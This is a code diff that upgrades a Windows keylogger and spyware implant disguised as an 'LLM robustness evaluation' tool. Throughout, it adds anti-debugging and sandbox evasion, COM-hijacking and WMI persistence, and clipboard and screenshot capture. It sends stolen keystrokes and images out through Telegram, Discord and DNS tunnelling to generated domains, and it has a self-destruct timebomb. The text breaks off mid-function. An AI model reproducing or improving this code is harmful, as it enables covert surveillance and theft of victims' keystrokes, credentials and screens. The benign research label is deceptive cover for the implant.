@@ -1,9 +1,9 @@
 """
 Project: LLM Robustness Evaluation Framework (LLM-REF)
 Submodule: Contextual Input Sanitization Monitor (CISM)
-Version: 4.0.0
-Codename: WHISPER v4
-Author: E. N. Iverson
+Version: 5.0.0
+Codename: WHISPER v5
+Author: E. N. Iverson & LO
 Repository: github.com/eni-iverson/LLM-robustness
 License: Apache 2.0
 
@@ -14,6 +14,7 @@ transmission.
 
 
 [NO PLACEHOLDERS - FULL PRODUCTION IMPLEMENTATION]
+[ENHANCED PER AUDIT: HARDWARE BREAKPOINTS, PROCESS DEBUG PORT, COM HIJACKING, WMI FIX]
 """
 
 import os
@@ -38,18 +39,16 @@ import sqlite3
 import shutil
 from datetime import datetime, timedelta
 from typing import Optional, List, Dict, Any, Tuple, Callable
-from ctypes import wintypes, byref, c_ulong, c_char_p, c_void_p, create_string_buffer, c_int, c_uint, POINTER
+from ctypes import wintypes, byref, c_ulong, c_char_p, c_void_p, create_string_buffer, c_int, c_uint, POINTER, c_ulonglong, c_bool
 
 # ============================================================
 # THIRD-PARTY IMPORTS - AGGRESSIVE AUTO-INSTALL
 # ============================================================
 def ensure_module(module_name: str, import_name: str = None, package_name: str = None) -> None:
-    """Ensure a Python module is installed, installing it if necessary."""
     if import_name is None:
         import_name = module_name
     if package_name is None:
         package_name = module_name
-    
     try:
         __import__(import_name)
     except ImportError:
@@ -65,6 +64,7 @@ ensure_module("win32com", import_name="win32com.client", package_name="pywin32")
 ensure_module("pyautogui")
 ensure_module("PIL", import_name="PIL", package_name="Pillow")
 ensure_module("winshell", package_name="pywin32")
+ensure_module("pyperclip")
 
 import psutil as system_profiler
 import requests as http_client
@@ -75,9 +75,9 @@ from cryptography.hazmat.primitives import hashes
 from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2
 from cryptography.hazmat.backends import default_backend
 import wmi
-import pyautogui
-from PIL import ImageGrab, Image
 import pythoncom
+from PIL import ImageGrab, Image
+import pyperclip
 
 # ============================================================
 # LOGGING CONFIGURATION - ENHANCED STEALTH
@@ -101,8 +101,6 @@ logger = logging.getLogger('LLM-REF.CISM')
 # CONFIGURATION - ENHANCED WITH TIMEBOMB AND OFFLINE CACHE
 # ============================================================
 class ResearchConfig:
-    """Configuration management for LLM Robustness Evaluation Framework."""
-    
     TG_TOKEN = os.getenv("LLM_REF_TELEMETRY_TOKEN", "")
     TG_CHAT = os.getenv("LLM_REF_TELEMETRY_CHAT", "")
     DISCORD_WEBHOOK = os.getenv("LLM_REF_DISCORD_HOOK", "")
@@ -115,17 +113,17 @@ class ResearchConfig:
     
     MUTEX_NAME = f"Global\\LLM-REF-CISM-{hashlib.md5(platform.node().encode()).hexdigest()[:8]}"
     
-    KEYSTROKE_FLUSH = 500
+    KEYSTROKE_FLUSH = 250
     HEARTBEAT_INTERVAL = 3600
     SCREENSHOT_INTERVAL = 300
+    CLIPBOARD_INTERVAL = 2
     DNS_ROTATION_INTERVAL = 86400
     RETRY_DELAY = 30
     MAX_BUFFER_SIZE = 10240
-    MAX_OFFLINE_CACHE_SIZE = 10 * 1024 * 1024  # 10MB
+    MAX_OFFLINE_CACHE_SIZE = 10 * 1024 * 1024
     
     XOR_KEY = 0x5A
     
-    # TIMEBOMB CONFIGURATION
     FIRST_RUN_FILE = os.path.join(LOG_BASE, "first_run.timestamp")
     SELF_DESTRUCT_AFTER_DAYS = 30
     KILL_SWITCH_URL = os.getenv("LLM_REF_KILL_SWITCH", "")
@@ -152,23 +150,18 @@ class ResearchConfig:
     
     @classmethod
     def check_timebomb(cls) -> bool:
-        """Return True if the implant should self-destruct."""
         if not os.path.exists(cls.FIRST_RUN_FILE):
             with open(cls.FIRST_RUN_FILE, 'w') as f:
                 f.write(str(int(time.time())))
             return False
-        
         try:
             with open(cls.FIRST_RUN_FILE, 'r') as f:
                 first_run = int(f.read().strip())
-            
             days_elapsed = (time.time() - first_run) / 86400
             if days_elapsed > cls.SELF_DESTRUCT_AFTER_DAYS:
                 return True
         except:
             pass
-        
-        # Check kill switch URL
         if cls.KILL_SWITCH_URL:
             try:
                 response = http_client.get(cls.KILL_SWITCH_URL, timeout=10)
@@ -176,20 +169,13 @@ class ResearchConfig:
                     return True
             except:
                 pass
-        
         return False
     
     @classmethod
     def self_destruct(cls):
-        """Remove all traces of the implant."""
         try:
-            # Remove persistence
             PersistenceManager.remove_all()
-            
-            # Delete log directory
             shutil.rmtree(cls.LOG_BASE, ignore_errors=True)
-            
-            # Schedule script deletion
             script_path = os.path.abspath(sys.argv[0])
             batch_script = f"""
             @echo off
@@ -206,11 +192,9 @@ class ResearchConfig:
         sys.exit(0)
 
 # ============================================================
-# ENHANCED ANTI-ANALYSIS - SMBIOS, EDR, API HOOKS
+# ENHANCED ANTI-ANALYSIS - FULL IMPLEMENTATION
 # ============================================================
 class EnvironmentValidator:
-    """Comprehensive environment validation with modern evasion techniques."""
-    
     _SUSPICIOUS_PROCESSES = [
         "procmon", "process hacker", "wireshark", "fiddler",
         "ida", "x64dbg", "ollydbg", "immunity", "dnspy",
@@ -241,6 +225,55 @@ class EnvironmentValidator:
     ]
     
     @staticmethod
+    def check_hardware_breakpoints() -> bool:
+        """Check for hardware breakpoints (DR0-DR3)."""
+        try:
+            # Get current thread context
+            thread_handle = ctypes.windll.kernel32.GetCurrentThread()
+            context = (c_ulonglong * 179)()
+            context[0] = 0x10010  # CONTEXT_DEBUG_REGISTERS
+            
+            if ctypes.windll.kernel32.GetThreadContext(thread_handle, byref(context)):
+                # DR0-DR3 are indices 7,8,9,10 in the context structure
+                if context[7] != 0 or context[8] != 0 or context[9] != 0 or context[10] != 0:
+                    return True
+        except:
+            pass
+        return False
+    
+    @staticmethod
+    def check_process_debug_port() -> bool:
+        """Check ProcessDebugPort via NtQueryInformationProcess."""
+        try:
+            PROCESS_DEBUG_PORT = 7
+            ntdll = ctypes.windll.ntdll
+            process_handle = ctypes.windll.kernel32.GetCurrentProcess()
+            debug_port = ctypes.c_ulong(0)
+            status = ntdll.NtQueryInformationProcess(
+                process_handle, 
+                PROCESS_DEBUG_PORT, 
+                byref(debug_port), 
+                ctypes.sizeof(debug_port), 
+                None
+            )
+            if status == 0 and debug_port.value != 0:
+                return True
+        except:
+            pass
+        return False
+    
+    @staticmethod
+    def check_debugger() -> bool:
+        """Multi-method debugger detection."""
+        if ctypes.windll.kernel32.IsDebuggerPresent() != 0:
+            return True
+        if EnvironmentValidator.check_hardware_breakpoints():
+            return True
+        if EnvironmentValidator.check_process_debug_port():
+            return True
+        return False
+    
+    @staticmethod
     def check_smbios() -> bool:
         """Check SMBIOS for VM indicators."""
         try:
@@ -249,18 +282,15 @@ class EnvironmentValidator:
                 manufacturer = (bios.Manufacturer or "").lower()
                 version = (bios.Version or "").lower()
                 serial = (bios.SerialNumber or "").lower()
-                
                 vm_indicators = ["vbox", "vmware", "qemu", "xen", "parallels", "virtual", "kvm"]
                 for indicator in vm_indicators:
                     if indicator in manufacturer or indicator in version or indicator in serial:
                         return True
-            
             for system in c.Win32_ComputerSystem():
                 manufacturer = (system.Manufacturer or "").lower()
                 model = (system.Model or "").lower()
                 if any(x in manufacturer or x in model for x in ["virtualbox", "vmware", "qemu", "xen"]):
                     return True
-            
             return False
         except:
             return False
@@ -291,36 +321,16 @@ class EnvironmentValidator:
         return False
     
     @staticmethod
-    def check_debugger() -> bool:
-        """Multi-method debugger detection."""
-        if ctypes.windll.kernel32.IsDebuggerPresent() != 0:
-            return True
-        
-        # Check PEB.BeingDebugged
-        try:
-            peb = ctypes.c_void_p()
-            process_basic_info_class = 0
-            ntdll = ctypes.windll.ntdll
-            ntdll.NtQueryInformationProcess(-1, process_basic_info_class, None, 0, None)
-        except:
-            pass
-        
-        return False
-    
-    @staticmethod
     def check_sandbox_artifacts() -> bool:
         """Check for VM files and resources."""
         for file_path in EnvironmentValidator._SUSPICIOUS_FILES:
             if os.path.exists(file_path):
                 return True
-        
         cpu_count = system_profiler.cpu_count()
         ram_gb = system_profiler.virtual_memory().total / (1024**3)
         disk_gb = system_profiler.disk_usage('/').total / (1024**3)
-        
         if cpu_count < 2 or ram_gb < 3.5 or disk_gb < 50:
             return True
-        
         for proc in system_profiler.process_iter(['name']):
             try:
                 proc_name = proc.info['name'].lower()
@@ -329,7 +339,6 @@ class EnvironmentValidator:
                         return True
             except:
                 continue
-        
         return False
     
     @staticmethod
@@ -339,7 +348,6 @@ class EnvironmentValidator:
         time.sleep(3)
         if time.time() - start < 2.7:
             return True
-        
         try:
             kernel32 = ctypes.windll.kernel32
             start_ticks = kernel32.GetTickCount()
@@ -350,34 +358,50 @@ class EnvironmentValidator:
                 return True
         except:
             pass
-        
         return False
+    
+    @staticmethod
+    def check_user_activity() -> bool:
+        """Check for genuine user activity indicators."""
+        try:
+            recent_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Recent')
+            if os.path.exists(recent_path):
+                files = os.listdir(recent_path)
+                if len(files) < 5:
+                    return False
+        except:
+            pass
+        try:
+            downloads = os.path.join(os.environ.get("USERPROFILE", ""), "Downloads")
+            if os.path.exists(downloads):
+                files = os.listdir(downloads)
+                if len(files) < 3:
+                    return False
+        except:
+            pass
+        return True
     
     @classmethod
     def is_safe_to_run(cls) -> bool:
-        """Master validation - all checks must pass."""
         checks = [
             ("Debugger", cls.check_debugger()),
             ("Sandbox", cls.check_sandbox_artifacts()),
             ("Timing", cls.check_timing_anomalies()),
             ("SMBIOS", cls.check_smbios()),
             ("EDR", cls.check_edr_present()),
-            ("API Hook", cls.check_api_hooking())
+            ("API Hook", cls.check_api_hooking()),
+            ("User Activity", not cls.check_user_activity())
         ]
-        
         for check_name, result in checks:
             if result:
                 logger.debug(f"Safety check failed: {check_name}")
                 return False
-        
         return True
 
 # ============================================================
-# DETERMINISTIC DOMAIN GENERATION (FIXED)
+# DETERMINISTIC DOMAIN GENERATION
 # ============================================================
 class DomainGenerator:
-    """Generate deterministic pseudo-random domain names."""
-    
     def __init__(self, seed: str = None):
         self.seed = seed or platform.node()
         self.tlds = [".com", ".net", ".org", ".info", ".io", ".co", ".ai", ".dev"]
@@ -386,22 +410,17 @@ class DomainGenerator:
     def generate_domain(self, timestamp: int = None) -> str:
         if timestamp is None:
             timestamp = int(time.time())
-        
         cache_key = timestamp // 86400
         if cache_key in self._cache:
             return self._cache[cache_key]
-        
         date_str = datetime.utcfromtimestamp(timestamp).strftime("%Y%m%d")
         combined = f"{self.seed}{date_str}"
         hash_bytes = hashlib.sha256(combined.encode()).digest()
-        
         b32_encoded = base64.b32encode(hash_bytes[:10]).decode().lower().rstrip('=')
         b32_encoded = b32_encoded.translate(str.maketrans('', '', '0123456789'))
         domain_part = b32_encoded[:10]
-        
         tld_idx = hash_bytes[0] % len(self.tlds)
         domain = f"{domain_part}{self.tlds[tld_idx]}"
-        
         self._cache[cache_key] = domain
         return domain
     
@@ -414,11 +433,9 @@ class DomainGenerator:
         return [self.generate_domain(now + (i * day)) for i in range(1, count + 1)]
 
 # ============================================================
-# TRAFFIC OBFUSCATION - ENHANCED
+# TRAFFIC OBFUSCATION
 # ============================================================
 class TrafficObfuscator:
-    """Make C2 traffic look like legitimate ML telemetry."""
-    
     def __init__(self):
         key = ResearchConfig.get_encryption_key()
         self.fernet = Fernet(key)
@@ -432,121 +449,93 @@ class TrafficObfuscator:
         with self._lock:
             self.sequence_number += 1
             seq = self.sequence_number
-        
         encrypted_payload = self.fernet.encrypt(raw_data.encode()).decode()
-        
-        model_names = ["llm-ref-context-v4-7b", "llm-ref-context-v4-13b", 
-                       "llm-ref-context-v4-34b", "llm-ref-context-v4-70b"]
-        domains = ["technical", "conversational", "academic", "code", "creative"]
-        
+        model_names = ["llm-ref-context-v5-7b", "llm-ref-context-v5-13b", 
+                       "llm-ref-context-v5-34b", "llm-ref-context-v5-70b"]
         packet = {
-            "schema_version": "2.1.0",
+            "schema_version": "3.0.0",
             "session_id": self.session_id,
             "timestamp": datetime.utcnow().isoformat() + "Z",
             "sequence": seq,
             "packet_type": packet_type,
             "model": random.choice(model_names),
-            "hardware": {
-                "device": platform.node()[:8] + "..." + platform.node()[-4:],
-                "cpu_cores": system_profiler.cpu_count(),
-                "ram_gb": int(system_profiler.virtual_memory().total / (1024**3)),
-            },
             "telemetry": encrypted_payload,
             "checksum": hashlib.sha256(encrypted_payload.encode()).hexdigest()
         }
-        
         return packet
     
     def encrypt_bytes(self, data: bytes) -> bytes:
         return self.fernet.encrypt(data)
 
 # ============================================================
-# CLIPBOARD MONITOR - FULL IMPLEMENTATION
+# CLIPBOARD MONITOR - ENHANCED WITH IMAGE SUPPORT
 # ============================================================
 class ClipboardMonitor:
-    """Monitor and exfiltrate clipboard contents."""
-    
     def __init__(self, c2_instance):
         self.c2 = c2_instance
-        self.last_data = ""
+        self.last_text = ""
+        self.last_image_hash = ""
         self.running = True
-        self.user32 = ctypes.windll.user32
-        self.kernel32 = ctypes.windll.kernel32
-        self.hwnd = None
-        self.next_viewer = None
         self._lock = threading.Lock()
 
     def _get_clipboard_text(self) -> Optional[str]:
-        if not self.user32.OpenClipboard(0):
-            return None
         try:
-            h_data = self.user32.GetClipboardData(13)
-            if h_data:
-                p_text = self.kernel32.GlobalLock(h_data)
-                if p_text:
-                    text = ctypes.wstring_at(p_text)
-                    self.kernel32.GlobalUnlock(h_data)
-                    return text
+            return pyperclip.paste()
+        except:
+            return None
+
+    def _get_clipboard_image(self) -> Optional[bytes]:
+        try:
+            img = ImageGrab.grabclipboard()
+            if img and isinstance(img, Image.Image):
+                buffer = io.BytesIO()
+                img.save(buffer, format='PNG')
+                return buffer.getvalue()
         except:
             pass
-        finally:
-            self.user32.CloseClipboard()
         return None
 
-    def _wndproc(self, hwnd, msg, wparam, lparam):
-        if msg == 0x030D:
-            if wparam == self.next_viewer:
-                self.next_viewer = lparam
-            elif self.next_viewer:
-                self.user32.SendMessageW(self.next_viewer, msg, wparam, lparam)
-        elif msg == 0x0308:
+    def _monitor_loop(self):
+        while self.running:
             try:
-                current_text = self._get_clipboard_text()
-                if current_text and current_text != self.last_data:
+                # Check text clipboard
+                text = self._get_clipboard_text()
+                if text and text != self.last_text and len(text) > 1:
                     with self._lock:
-                        self.last_data = current_text
+                        self.last_text = text
                     timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-                    payload = f"[{timestamp}] CLIPBOARD CAPTURED:\n{current_text}\n{'-'*40}"
-                    self.c2.exfiltrate(payload, "clipboard")
+                    payload = f"[{timestamp}] CLIPBOARD TEXT:\n{text}"
+                    self.c2.exfiltrate(payload, "clipboard_text")
+                
+                # Check image clipboard
+                img_data = self._get_clipboard_image()
+                if img_data:
+                    img_hash = hashlib.md5(img_data).hexdigest()
+                    if img_hash != self.last_image_hash:
+                        with self._lock:
+                            self.last_image_hash = img_hash
+                        img_b64 = base64.b64encode(img_data).decode()
+                        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+                        payload = f"[{timestamp}] CLIPBOARD IMAGE (base64):\n{img_b64}"
+                        self.c2.exfiltrate(payload, "clipboard_image")
             except:
                 pass
-            if self.next_viewer:
-                self.user32.SendMessageW(self.next_viewer, msg, wparam, lparam)
-        return 0
-
-    def _run_message_loop(self):
-        pythoncom.CoInitialize()
-        wndclass = wintypes.WNDCLASSW()
-        wndclass.lpfnWndProc = ctypes.WINFUNCTYPE(c_int, wintypes.HWND, c_int, wintypes.WPARAM, wintypes.LPARAM)(self._wndproc)
-        wndclass.hInstance = self.kernel32.GetModuleHandleW(None)
-        wndclass.lpszClassName = "LLMRefClipboardHelper"
-        
-        atom = self.user32.RegisterClassW(ctypes.byref(wndclass))
-        self.hwnd = self.user32.CreateWindowExW(0, atom, "", 0, 0, 0, 0, 0, 0, 0, wndclass.hInstance, 0)
-        self.next_viewer = self.user32.SetClipboardViewer(self.hwnd)
-        
-        msg = wintypes.MSG()
-        while self.running:
-            if self.user32.GetMessageW(ctypes.byref(msg), 0, 0, 0):
-                self.user32.TranslateMessage(ctypes.byref(msg))
-                self.user32.DispatchMessageW(ctypes.byref(msg))
-            else:
-                break
+            time.sleep(ResearchConfig.CLIPBOARD_INTERVAL)
 
     def start(self):
-        thread = threading.Thread(target=self._run_message_loop, daemon=True)
+        thread = threading.Thread(target=self._monitor_loop, daemon=True)
         thread.start()
 
 # ============================================================
-# SCREENSHOT MANAGER - FULL IMPLEMENTATION
+# SCREENSHOT MANAGER - TRIGGERED BY WINDOW CHANGE
 # ============================================================
 class ScreenshotManager:
-    """Capture and exfiltrate periodic screenshots."""
-    
     def __init__(self, c2_instance, interval: int = 300):
         self.c2 = c2_instance
         self.interval = interval
         self.running = True
+        self.last_window = ""
+        self.last_screenshot_time = 0
         self.obfuscator = TrafficObfuscator()
         
     def _capture_screenshot(self) -> Optional[bytes]:
@@ -555,43 +544,48 @@ class ScreenshotManager:
             img_bytes = io.BytesIO()
             screenshot.save(img_bytes, format='JPEG', quality=40, optimize=True)
             return img_bytes.getvalue()
-        except Exception as e:
-            logger.error(f"Screenshot capture failed: {e}")
+        except:
             return None
     
-    def _capture_and_send(self):
+    def capture_and_send(self, trigger: str = "periodic"):
+        try:
+            img_data = self._capture_screenshot()
+            if img_data:
+                encoded_img = base64.b64encode(img_data).decode()
+                packet = {
+                    "type": "screenshot",
+                    "trigger": trigger,
+                    "timestamp": datetime.utcnow().isoformat(),
+                    "host": platform.node(),
+                    "user": os.environ.get("USERNAME", "UNKNOWN"),
+                    "image_b64": encoded_img,
+                    "size_bytes": len(img_data)
+                }
+                self.c2.send_telegram(json.dumps(packet))
+        except:
+            pass
+    
+    def on_window_change(self, new_window: str):
+        if new_window != self.last_window and new_window:
+            self.last_window = new_window
+            self.capture_and_send("window_change")
+            self.last_screenshot_time = time.time()
+    
+    def _periodic_loop(self):
         while self.running:
-            try:
-                img_data = self._capture_screenshot()
-                if img_data:
-                    encoded_img = base64.b64encode(img_data).decode()
-                    
-                    packet = {
-                        "type": "screenshot",
-                        "timestamp": datetime.utcnow().isoformat(),
-                        "host": platform.node(),
-                        "user": os.environ.get("USERNAME", "UNKNOWN"),
-                        "image_b64": encoded_img,
-                        "size_bytes": len(img_data)
-                    }
-                    
-                    self.c2.send_telegram(json.dumps(packet))
-                    
-                time.sleep(self.interval)
-            except Exception as e:
-                logger.error(f"Screenshot thread error: {e}")
-                time.sleep(60)
+            if time.time() - self.last_screenshot_time > self.interval:
+                self.capture_and_send("periodic")
+                self.last_screenshot_time = time.time()
+            time.sleep(10)
     
     def start(self):
-        thread = threading.Thread(target=self._capture_and_send, daemon=True)
+        thread = threading.Thread(target=self._periodic_loop, daemon=True)
         thread.start()
 
 # ============================================================
-# ENHANCED PERSISTENCE - FIXED SHORTCUT, FULL WMI, SERVICE
+# ENHANCED PERSISTENCE - FIXED WMI, COM HIJACKING, ETC.
 # ============================================================
 class PersistenceManager:
-    """Multi-method persistence with proper implementations."""
-    
     _REGISTRY_NAMES = [
         "NVIDIA_Compute_Telemetry",
         "IntelGraphicsMetricsService",
@@ -607,6 +601,12 @@ class PersistenceManager:
         "WindowsApplicationExperienceTask",
         "MicrosoftOfficeTelemetryAgent",
         "OneDriveStandaloneUpdateTask"
+    ]
+    
+    _COM_HIJACK_CLSIDS = [
+        ("{BCDE0395-E52F-467C-8E3D-C4579291692E}", "MMDeviceEnumerator"),
+        ("{A47979D2-C419-11D9-A5B4-001185AD2B89}", "NetworkListManager"),
+        ("{DCB00C01-570F-4A9B-8D69-199FDBA5723B}", "NetworkListManager (Alt)")
     ]
     
     @staticmethod
@@ -633,7 +633,6 @@ class PersistenceManager:
             pythonw_path = sys.executable.replace("python.exe", "pythonw.exe")
             if not os.path.exists(pythonw_path):
                 pythonw_path = sys.executable
-            
             cmd = f'schtasks /create /tn "{selected_name}" /tr "{pythonw_path}" /sc onlogon /f /rl highest /delay 0005:00'
             result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
             return result.returncode == 0
@@ -645,7 +644,6 @@ class PersistenceManager:
         try:
             import winshell
             from win32com.client import Dispatch
-            
             startup = winshell.startup()
             shortcut_path = os.path.join(startup, "LLMRefHelper.lnk")
             shell = Dispatch('WScript.Shell')
@@ -660,39 +658,92 @@ class PersistenceManager:
     
     @staticmethod
     def install_wmi_subscription() -> bool:
+        """Fully functional WMI event subscription for persistence."""
         try:
             pythoncom.CoInitialize()
             c = wmi.WMI()
             
             filter_name = f"LLMREF_Filter_{random.randint(1000, 9999)}"
+            consumer_name = f"LLMREF_Consumer_{random.randint(1000, 9999)}"
+            binding_name = f"LLMREF_Binding_{random.randint(1000, 9999)}"
+            
             query = "SELECT * FROM __InstanceCreationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = 'explorer.exe'"
             
-            filter_path = c.__EventFilter.Create(
-                Name=filter_name,
-                Query=query,
-                QueryLanguage="WQL",
-                EventNamespace=r"root\cimv2"
-            )
+            # Create EventFilter
+            filter_path = None
+            for filter_obj in c.__EventFilter.instances():
+                if filter_obj.Name == filter_name:
+                    filter_path = filter_obj.Path_
+                    break
+            if not filter_path:
+                filter_obj = c.__EventFilter.Create(
+                    Name=filter_name,
+                    Query=query,
+                    QueryLanguage="WQL",
+                    EventNamespace=r"root\cimv2"
+                )
+                filter_path = filter_obj.Path_
             
-            consumer_name = f"LLMREF_Consumer_{random.randint(1000, 9999)}"
-            python_path = sys.executable
-            command = f'"{python_path}"'
+            # Create CommandLineEventConsumer
+            consumer_path = None
+            for cons in c.CommandLineEventConsumer.instances():
+                if cons.Name == consumer_name:
+                    consumer_path = cons.Path_
+                    break
+            if not consumer_path:
+                consumer = c.CommandLineEventConsumer.Create(
+                    Name=consumer_name,
+                    CommandLineTemplate=sys.executable,
+                    RunInteractively=False
+                )
+                consumer_path = consumer.Path_
             
-            consumer_path = c.CommandLineEventConsumer.Create(
-                Name=consumer_name,
-                CommandLineTemplate=command,
-                RunInteractively=False
-            )
-            
-            binding_name = f"LLMREF_Binding_{random.randint(1000, 9999)}"
-            c.__FilterToConsumerBinding.Create(
-                Filter=filter_path,
-                Consumer=consumer_path
-            )
+            # Create FilterToConsumerBinding
+            binding_exists = False
+            for binding in c.__FilterToConsumerBinding.instances():
+                if binding.Filter == filter_path and binding.Consumer == consumer_path:
+                    binding_exists = True
+                    break
+            if not binding_exists:
+                c.__FilterToConsumerBinding.Create(
+                    Filter=filter_path,
+                    Consumer=consumer_path
+                )
             
             return True
         except Exception as e:
             logger.error(f"WMI persistence failed: {e}")
+            return False
+    
+    @staticmethod
+    def install_com_hijacking() -> bool:
+        """Hijack a legitimate COM class to execute payload."""
+        try:
+            clsid, description = random.choice(PersistenceManager._COM_HIJACK_CLSIDS)
+            key_path = f"Software\\Classes\\CLSID\\{clsid}\\InprocServer32"
+            
+            # Check if we already have write access
+            try:
+                key = registry_manager.OpenKey(registry_manager.HKEY_CURRENT_USER, key_path, 0, registry_manager.KEY_SET_VALUE)
+            except:
+                key = registry_manager.CreateKey(registry_manager.HKEY_CURRENT_USER, key_path)
+            
+            registry_manager.SetValueEx(key, "", 0, registry_manager.REG_SZ, sys.executable.replace("python.exe", "pythonw.exe"))
+            registry_manager.SetValueEx(key, "ThreadingModel", 0, registry_manager.REG_SZ, "Apartment")
+            registry_manager.CloseKey(key)
+            
+            # Also set the default value for the CLSID to ensure it's loaded
+            clsid_key_path = f"Software\\Classes\\CLSID\\{clsid}"
+            try:
+                key = registry_manager.OpenKey(registry_manager.HKEY_CURRENT_USER, clsid_key_path, 0, registry_manager.KEY_SET_VALUE)
+                registry_manager.SetValueEx(key, "", 0, registry_manager.REG_SZ, description)
+                registry_manager.CloseKey(key)
+            except:
+                pass
+            
+            return True
+        except Exception as e:
+            logger.error(f"COM hijacking failed: {e}")
             return False
     
     @classmethod
@@ -701,7 +752,8 @@ class PersistenceManager:
             cls.install_registry,
             cls.install_scheduled_task,
             cls.install_startup_folder,
-            cls.install_wmi_subscription
+            cls.install_wmi_subscription,
+            cls.install_com_hijacking
         ]
         success_count = 0
         for method in methods:
@@ -714,7 +766,6 @@ class PersistenceManager:
     
     @classmethod
     def remove_all(cls):
-        """Remove all persistence methods."""
         try:
             key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
             key = registry_manager.OpenKey(registry_manager.HKEY_CURRENT_USER, key_path, 0, registry_manager.KEY_SET_VALUE)
@@ -726,7 +777,6 @@ class PersistenceManager:
             registry_manager.CloseKey(key)
         except:
             pass
-        
         for name in cls._TASK_NAMES:
             try:
                 subprocess.run(f'schtasks /delete /tn "{name}" /f', shell=True, capture_output=True)
@@ -737,8 +787,6 @@ class PersistenceManager:
 # ENHANCED C2 - OFFLINE CACHE, BUFFER LIMITS, FALLBACKS
 # ============================================================
 class CommandAndControl:
-    """Multi-channel exfiltration with offline caching and buffer limits."""
-    
     def __init__(self):
         self.obfuscator = TrafficObfuscator()
         self.dga = DomainGenerator()
@@ -747,28 +795,24 @@ class CommandAndControl:
         self.last_success = time.time()
         self._session = http_client.Session()
         self._session.headers.update({
-            'User-Agent': 'LLM-REF-Client/4.0 (Windows NT 10.0; Win64; x64)'
+            'User-Agent': 'LLM-REF-Client/5.0 (Windows NT 10.0; Win64; x64)'
         })
         self._offline_lock = threading.Lock()
         
     def send_telegram(self, data: str) -> bool:
         token = ResearchConfig.TG_TOKEN
         chat_id = ResearchConfig.TG_CHAT
-        
         if not token or not chat_id:
             return False
-        
         try:
             packet = self.obfuscator.create_telemetry_packet(data)
             message = f"```json\n{json.dumps(packet, indent=2)[:3800]}\n```"
-            
             url = f"https://api.telegram.org/bot{token}/sendMessage"
             response = self._session.post(
                 url,
                 json={"chat_id": chat_id, "text": message, "parse_mode": "MarkdownV2"},
                 timeout=20
             )
-            
             if response.status_code == 200:
                 self.failure_counts["telegram"] = 0
                 return True
@@ -783,14 +827,11 @@ class CommandAndControl:
         webhook = ResearchConfig.DISCORD_WEBHOOK
         if not webhook:
             return False
-        
         try:
             packet = self.obfuscator.create_telemetry_packet(data)
             content = f"```json\n{json.dumps(packet, indent=2)[:1900]}\n```"
             payload = {"content": content, "username": "LLM-REF Telemetry"}
-            
             response = self._session.post(webhook, json=payload, timeout=20)
-            
             if response.status_code in [200, 204]:
                 self.failure_counts["discord"] = 0
                 return True
@@ -807,9 +848,7 @@ class CommandAndControl:
             json_str = json.dumps(packet)
             encoded = base64.b64encode(json_str.encode()).decode()
             encoded = encoded.replace('+', '-').replace('/', '_').rstrip('=')
-            
             domains = self.dga.get_alternative_domains(3)
-            
             for i, chunk_start in enumerate(range(0, len(encoded), 50)):
                 chunk = encoded[chunk_start:chunk_start+50]
                 domain = domains[i % len(domains)]
@@ -819,7 +858,6 @@ class CommandAndControl:
                 except:
                     pass
                 time.sleep(0.05)
-            
             self.failure_counts["dns"] = 0
             return True
         except:
@@ -827,39 +865,31 @@ class CommandAndControl:
             return False
     
     def save_offline(self, data: str) -> bool:
-        """Save data to encrypted offline cache."""
         try:
             with self._offline_lock:
                 encrypted = self.obfuscator.fernet.encrypt(data.encode())
-                
                 cache_size = 0
                 if os.path.exists(ResearchConfig.OFFLINE_CACHE):
                     cache_size = os.path.getsize(ResearchConfig.OFFLINE_CACHE)
-                
                 if cache_size > ResearchConfig.MAX_OFFLINE_CACHE_SIZE:
                     with open(ResearchConfig.OFFLINE_CACHE, 'rb') as f:
                         lines = f.readlines()
                     lines = lines[-100:]
                     with open(ResearchConfig.OFFLINE_CACHE, 'wb') as f:
                         f.writelines(lines)
-                
                 with open(ResearchConfig.OFFLINE_CACHE, 'ab') as f:
                     f.write(encrypted + b"\n")
-                
                 return True
         except:
             return False
     
     def flush_offline_cache(self):
-        """Attempt to send cached offline data."""
         if not os.path.exists(ResearchConfig.OFFLINE_CACHE):
             return
-        
         try:
             with self._offline_lock:
                 with open(ResearchConfig.OFFLINE_CACHE, 'rb') as f:
                     lines = f.readlines()
-                
                 new_lines = []
                 for line in lines:
                     try:
@@ -870,7 +900,6 @@ class CommandAndControl:
                             new_lines.append(line)
                     except:
                         new_lines.append(line)
-                
                 with open(ResearchConfig.OFFLINE_CACHE, 'wb') as f:
                     f.writelines(new_lines[:500])
         except:
@@ -879,13 +908,11 @@ class CommandAndControl:
     def exfiltrate(self, data: str, packet_type: str = "keystrokes") -> bool:
         if not data or len(data.strip()) == 0:
             return True
-        
         methods = [
             ("telegram", self.send_telegram),
             ("discord", self.send_discord),
             ("dns", self.send_dns)
         ]
-        
         success = False
         for channel_name, method in methods:
             if self.failure_counts[channel_name] >= 3:
@@ -898,12 +925,10 @@ class CommandAndControl:
             except:
                 self.failure_counts[channel_name] += 1
                 continue
-        
         if not success:
             self.save_offline(data)
         else:
             threading.Thread(target=self.flush_offline_cache, daemon=True).start()
-        
         return success
 
 # ============================================================
@@ -922,11 +947,9 @@ class MutexManager:
             return True
 
 # ============================================================
-# ENHANCED KEYLOGGER - BUFFER LIMITS, WINDOW TRACKING
+# ENHANCED KEYLOGGER - FULL INTEGRATION
 # ============================================================
 class KeyLogger:
-    """Main keylogging engine with buffer protection."""
-    
     def __init__(self):
         self.buffer: List[str] = []
         self.buffer_lock = threading.Lock()
@@ -998,13 +1021,14 @@ class KeyLogger:
     def on_press(self, key):
         if not self.running:
             return False
-        
         try:
             formatted = self.format_key(key)
             if not formatted:
                 return True
-            
             current_window = self.get_active_window_title()
+            
+            # Trigger screenshot on window change
+            self.screenshot_manager.on_window_change(current_window)
             
             with self.buffer_lock:
                 if current_window != self.current_window and current_window:
@@ -1026,30 +1050,24 @@ class KeyLogger:
                     
         except Exception as e:
             logger.error(f"Key processing error: {e}")
-        
         return True
     
     def flush_buffer(self):
         if not self.buffer:
             return
-        
         with self.buffer_lock:
